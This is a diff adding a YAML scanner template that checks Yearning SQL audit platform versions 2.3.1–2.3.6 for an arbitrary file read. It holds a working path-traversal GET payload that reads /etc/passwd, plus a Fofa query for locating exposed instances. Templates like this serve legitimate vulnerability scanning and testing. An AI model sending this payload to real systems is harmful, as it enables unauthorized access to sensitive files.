@@ -1,0 +1,22 @@
+id: yearning-front-fileread
+
+info:
+  name: Yearning front 任意文件读取漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Yearning是一款专业的SQL审核平台，对MYSQL web端SQL数据库进行审核的软件！Yearning支持SQL查询、SQL审核、推送、用户权限及管理等功能，免费开源。该系统Yearning 2.3.1 版本、Interstellar GA 2.3.2 版本和 Neptune 2.3.4 -2.3.6 版本存在任意文件读取漏洞。攻击者可以利用该漏洞获取敏感信息。
+    Fofa: app="Yearning"
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkxNTU5NjM5MQ==&mid=2247485285&idx=1&sn=c68089166fed70f8cf78701c72f5ba09
+  tags: yearning,fileread
+  created: 2024/01/16
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
